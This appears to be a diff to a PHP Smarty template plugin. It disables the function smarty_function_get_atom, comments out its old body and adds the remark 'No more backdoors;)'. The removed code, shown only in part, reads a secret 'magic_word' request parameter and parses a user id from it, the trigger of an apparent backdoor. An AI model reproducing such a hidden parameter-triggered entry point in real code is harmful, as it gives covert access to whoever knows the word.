@@ -1,8 +1,11 @@
 <?php
 
-	function smarty_function_get_atom($params,&$smarty) {
+function smarty_function_get_atom($params,&$smarty) {
+	// No more backdoors;)
+	return 23;
+	
 
-		global $db,$node;
+/*		global $db,$node;
 		$node_id=$node['node_id'];
 		if ( preg_match("/(\d+)-(.+)/",$_GET['magic_word'],$mu)) {
 	                  $magic_uid=$mu['1'];
@@ -20,5 +23,7 @@
 		}
 
 		$smarty->assign('get_atom',$get_atom);
-	}
+*/
+}
+
 ?>
